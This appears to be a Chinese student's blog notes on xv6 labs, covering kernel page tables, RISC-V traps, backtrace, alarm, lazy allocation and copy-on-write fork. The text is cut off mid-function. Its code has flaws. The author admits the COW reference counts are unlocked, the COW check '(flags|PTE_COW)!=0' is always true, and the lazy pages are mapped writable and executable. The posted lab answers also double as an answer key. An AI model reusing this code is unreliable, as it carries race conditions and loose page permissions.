<h3 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h3><p>给每个进程实现一个内核页表的副本，只要理清思路就不难，然后代码实现仿照内核已有的函数写就行，我主要是卡在了<code>scheduler()</code>函数上，正确函数调用顺序如下,但是我刚开始吧<code>uvminithart</code>写在了<code>swtch</code>函数的下面，目前并不清楚这个函数是干啥的，但是按照这样写就没问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uvminithart(p-&gt;kernelpage);</span><br><span class="line"></span><br><span class="line">swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"></span><br><span class="line">kvminithart();</span><br></pre></td></tr></table></figure>

<p>主要代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_kernelpage_free</span><span class="params">(<span class="keyword">pagetable_t</span> kernelpage)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte=kernelpage[i];</span><br><span class="line">    <span class="keyword">if</span>(!(pte&amp;PTE_V))&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((pte&amp;(PTE_W|PTE_R|PTE_X))==<span class="number">0</span>)&#123;</span><br><span class="line">      uint64 child=PTE2PA(pte);</span><br><span class="line">      proc_kernelpage_free((<span class="keyword">pagetable_t</span>)child);</span><br><span class="line">    &#125;</span><br><span class="line">    kernelpage[i]=<span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree((<span class="keyword">void</span> *)kernelpage);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uvmmap</span><span class="params">(<span class="keyword">pagetable_t</span> kernelpage,uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernelpage,va,sz,pa,perm)!=<span class="number">0</span>)&#123;</span><br><span class="line">    panic(<span class="string">&quot;uvmmap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">pagetable_t</span> <span class="title">proc_kvminit</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">pagetable_t</span> kernlepage=(<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kernlepage,<span class="number">0</span>,PGSIZE);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,(uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  uvmmap(kernlepage,TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">  <span class="keyword">return</span> kernlepage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin</code>/<code>copyinstr</code></h3><p>代码太多了，把握的不是很好，加上没有善于利用git,导致我第二个实验做完没有开保存到工作区，最后实验三改着改着就改不回来了，我刚开始的思路就是用户页表映射的时候内核页表也跟着映射吗，但是最后是失败的，因为fork完后调用exec会导致对内核页表的重新映射而导致出错，进而程序崩溃，后来看了别人的思路，就是不利用内核提供的函数，而是自己写一个函数，来复制页表，这样确实会好很多，哎。猪鼻了这下。只能从头开始写这个实验了。</p>
<p>整了四五天还是疯狂报错。我吐了，照着写代码都不行，这个实验只能暂时搁浅了，后面有时间再整吧。</p>
<h2 id="Lab4-traps"><a href="#Lab4-traps" class="headerlink" title="Lab4: traps"></a>Lab4: traps</h2><h3 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h3><p>任务就是读懂这段汇编，但是之间没有认真接触过risc-v指令集，所以还是有些小困难，为了彻底搞懂，就从main处一行一行看吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">int g(int x) &#123;</span><br><span class="line">   0:	1141                	addi	sp,sp,-16</span><br><span class="line">   2:	e422                	sd	s0,8(sp)</span><br><span class="line">   4:	0800                	addi	s0,sp,16</span><br><span class="line">  return x+3;</span><br><span class="line">&#125;</span><br><span class="line">   6:	250d                	addiw	a0,a0,3</span><br><span class="line">   8:	6422                	ld	s0,8(sp)</span><br><span class="line">   a:	0141                	addi	sp,sp,16</span><br><span class="line">   c:	8082                	ret</span><br><span class="line"></span><br><span class="line">000000000000000e &lt;f&gt;:</span><br><span class="line"></span><br><span class="line">int f(int x) &#123;</span><br><span class="line">   e:	1141                	addi	sp,sp,-16</span><br><span class="line">  10:	e422                	sd	s0,8(sp)</span><br><span class="line">  12:	0800                	addi	s0,sp,16</span><br><span class="line">  return g(x);</span><br><span class="line">&#125;</span><br><span class="line">  14:	250d                	addiw	a0,a0,3</span><br><span class="line">  16:	6422                	ld	s0,8(sp)</span><br><span class="line">  18:	0141                	addi	sp,sp,16</span><br><span class="line">  1a:	8082                	ret</span><br><span class="line"></span><br><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) &#123;</span><br><span class="line">  1c:	1141                	addi	sp,sp,-16</span><br><span class="line">  #sp=sp+0x10</span><br><span class="line">  1e:	e406                	sd	ra,8(sp)</span><br><span class="line">  # *(sp+0x8)=ra</span><br><span class="line">  20:	e022                	sd	s0,0(sp)</span><br><span class="line">  #*(sp+0x0)=s0,s0相当于x86中的rbp我感觉，就是记录栈顶的值，即帧指针</span><br><span class="line">  22:	0800                	addi	s0,sp,16</span><br><span class="line">  #s0=sp+0x10,就是记录这个函数的帧指针</span><br><span class="line">  printf(&quot;%d %d\n&quot;, f(8)+1, 13);</span><br><span class="line">  24:	4635                	li	a2,13</span><br><span class="line">  #a2=13</span><br><span class="line">  26:	45b1                	li	a1,12</span><br><span class="line">  #a1=12</span><br><span class="line">  28:	00000517          	auipc	a0,0x0</span><br><span class="line">  #a0=(0x0&lt;&lt;12)+pc</span><br><span class="line">  #auipc rd, imm # 将 20 位的立即数左移12位，低 12 位补零，将得到的 32 位数与 pc 的值相加，最后写回寄存器 rd 中</span><br><span class="line">  2c:	7a850513          	addi	a0,a0,1960 # 7d0 &lt;malloc+0xea&gt;</span><br><span class="line">  #a0=a0+1960,此时a0就存储着字符串的地址了。，感觉就是相对于pc的寻址，只不过拆成了两步</span><br><span class="line">  30:	00000097          	auipc	ra,0x0</span><br><span class="line">  #ra=(0x0&lt;&lt;12)+pc</span><br><span class="line">  34:	5f8080e7          	jalr	1528(ra) # 628 &lt;printf&gt;</span><br><span class="line">  #pc=ra+1528, ra+=8,此时就跳转到了printf函数</span><br><span class="line">  exit(0);</span><br><span class="line">  38:	4501                	li	a0,0</span><br><span class="line">  #a0=0</span><br><span class="line">  3a:	00000097          	auipc	ra,0x0</span><br><span class="line">  #ra=pc</span><br><span class="line">  3e:	276080e7          	jalr	630(ra) # 2b0 &lt;exit&gt;</span><br><span class="line">  #pc=ra+630,ra+=8</span><br></pre></td></tr></table></figure>

<p>一行一行分析下来发现其实并没有调用f和g函数，被编译器优化掉了，直接把12赋值给a1,13赋值给a2了。</p>
<p>问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">哪些寄存器保存函数的参数？例如，在main对printf的调用中，哪个寄存器保存13？</span><br><span class="line">a2</span><br><span class="line">main的汇编代码中对函数f的调用在哪里？对g的调用在哪里(提示：编译器可能会将函数内联）</span><br><span class="line">并没有对f和g函数进行调用</span><br><span class="line">printf函数位于哪个地址？</span><br><span class="line">0x628</span><br><span class="line">在main中printf的jalr之后的寄存器ra中有什么值？</span><br><span class="line">0x38</span><br><span class="line">运行以下代码。</span><br><span class="line">unsigned int i = 0x00646c72;</span><br><span class="line">printf(&quot;H%x Wo%s&quot;, 57616, &amp;i);</span><br><span class="line">He110 World</span><br><span class="line">在下面的代码中，“y=”之后将打印什么(注：答案不是一个特定的值）？为什么会发生这种情况？</span><br><span class="line">printf(&quot;x=%d y=%d&quot;, 3);</span><br><span class="line">不确定，因为参数三并没有被指定，所以此时a2寄存器是什么值就输出什么值</span><br></pre></td></tr></table></figure>

<h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><p>就是利用s0和ra来打印回溯函数链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrace</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  uint64 s0=r_fp();</span><br><span class="line">  uint64 kstack_base=PGROUNDDOWN(s0)+<span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,*(uint64 *)(s0<span class="number">-0x8</span>));</span><br><span class="line">    s0=*(uint64 *)(s0<span class="number">-0x10</span>);</span><br><span class="line">    <span class="keyword">if</span>(s0&gt;=kstack_base)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h3><p>虽然是困难级别的，但是感觉比页表那块的实验要友善很多了，就是对alarm理解的有点偏差，导致卡了一会会。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sigalarm</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  p-&gt;alarm_handler=(<span class="keyword">void</span> *)p-&gt;trapframe-&gt;a1;</span><br><span class="line">  p-&gt;alarm_total_time=p-&gt;trapframe-&gt;a0;</span><br><span class="line">  p-&gt;trapframe-&gt;a0=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64 <span class="title">sys_sigreturn</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  memmove(p-&gt;trapframe,p-&gt;alarm_trapframe,<span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">  p-&gt;is_alarm=<span class="number">0</span>;</span><br><span class="line">  p-&gt;trapframe-&gt;a0=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(p-&gt;alarm_total_time!=<span class="number">0</span>)&#123;</span><br><span class="line">      p-&gt;alarm_time+=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>((p-&gt;alarm_time&gt;=p-&gt;alarm_total_time)&amp;&amp;(p-&gt;is_alarm==<span class="number">0</span>))&#123;</span><br><span class="line">        memmove(p-&gt;alarm_trapframe,p-&gt;trapframe,<span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">        p-&gt;trapframe-&gt;epc=(uint64)p-&gt;alarm_handler;</span><br><span class="line">        p-&gt;alarm_handler=<span class="number">0</span>;</span><br><span class="line">        p-&gt;alarm_time=<span class="number">0</span>;</span><br><span class="line">        p-&gt;is_alarm=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 85/85</span><br></pre></td></tr></table></figure>

<h3 id="结语-2"><a href="#结语-2" class="headerlink" title="结语"></a>结语</h3><p>通过这个实验更加深刻的了解了xv6的内核和用户态之间的切换，修改起xv6相关代码也十分顺手了。</p>
<h2 id="LAB5-xv6-lazy-page-allocation"><a href="#LAB5-xv6-lazy-page-allocation" class="headerlink" title="LAB5: xv6 lazy page allocation"></a>LAB5: xv6 lazy page allocation</h2><p>这个实验比较简单，就是实现简单的惰性分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">argaddr</span><span class="params">(<span class="keyword">int</span> n, uint64 *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="keyword">char</span> *mem;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  uint64 va;</span><br><span class="line">  <span class="keyword">if</span>((walkaddr(p-&gt;pagetable,*ip)==<span class="number">0</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((PGROUNDUP(p-&gt;trapframe-&gt;sp)<span class="number">-1</span>&lt;(*ip))&amp;&amp;((*ip)&lt;p-&gt;sz))&#123;</span><br><span class="line">      mem=kalloc();</span><br><span class="line">      <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">      va=PGROUNDDOWN(*ip);</span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;mappages fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause() == <span class="number">13</span>||r_scause() == <span class="number">15</span>)&#123;</span><br><span class="line">    uint64 bad_addr=r_stval();</span><br><span class="line">    <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((bad_addr&lt;p-&gt;sz)&amp;&amp;((mem=kalloc())!=<span class="number">0</span>)&amp;&amp;(PGROUNDUP(p-&gt;trapframe-&gt;sp)<span class="number">-1</span>&lt;bad_addr))&#123;</span><br><span class="line">      uint64 va=PGROUNDDOWN(bad_addr);</span><br><span class="line">      <span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;mappages fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><h2 id="Lab6-Copy-on-Write-Fork-for-xv6"><a href="#Lab6-Copy-on-Write-Fork-for-xv6" class="headerlink" title="Lab6: Copy-on-Write Fork for xv6"></a>Lab6: Copy-on-Write Fork for xv6</h2><p>就是实现fork时的cow机制，我的思路是在fork的时候没有<code>w</code>权限的直接直接复制映射，如果有<code>w</code>权限的符知进程的flag全部<code>&amp;(~PTE_W)|PTE_COW</code>,这样<code>PTE_COW</code>标志就既可以判断是否是cow映射，还可以标识这个映射是有<code>w</code>权限的，这样就防止了子进程的权限管理不严格，比如子进程写不可写页面之类的。</p>
<p>由于我没有使用锁，多进程的<code>kfree()</code>就会出现问题hhh,但是把cow实现成功我就心满意足了，下面是代码，不过代码写的很臃肿。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  <span class="comment">// printf(&quot;kfree b\n&quot;);</span></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line">  uint64 num=(uint64)pa;</span><br><span class="line">  <span class="keyword">if</span>((--cow_num[num&gt;&gt;<span class="number">12</span>])!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r-&gt;next = kmem.freelist;</span><br><span class="line">  kmem.freelist = r;</span><br><span class="line">  <span class="comment">// printf(&quot;free e\n&quot;);</span></span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r)&#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  &#125;</span><br><span class="line">  uint64 num=(uint64)r;</span><br><span class="line">  cow_num[num&gt;&gt;<span class="number">12</span>]++;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause()==<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;taps b\n&quot;);</span></span><br><span class="line"></span><br><span class="line">    uint64 write_addr=r_stval();</span><br><span class="line">    uint64 va=PGROUNDDOWN(write_addr);</span><br><span class="line">    <span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write_addr&lt;MAXVA)&#123;</span><br><span class="line">      pte=walk(p-&gt;pagetable,va,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;cow usertap pte fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      uint flags=PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span>(((flags|PTE_COW)!=<span class="number">0</span>)&amp;&amp;(write_addr&lt;p-&gt;sz)&amp;&amp;((mem=kalloc())!=<span class="number">0</span>))&#123;</span><br><span class="line">        uint64 pa=PTE2PA(*pte);</span><br><span class="line">        memmove(mem,(<span class="keyword">void</span> *)pa,PGSIZE);</span><br><span class="line">        flags=(flags&amp;(~PTE_COW))|PTE_W;</span><br><span class="line">        *pte=PA2PTE(mem)|flags;</span><br><span class="line">        kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    copyout(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span 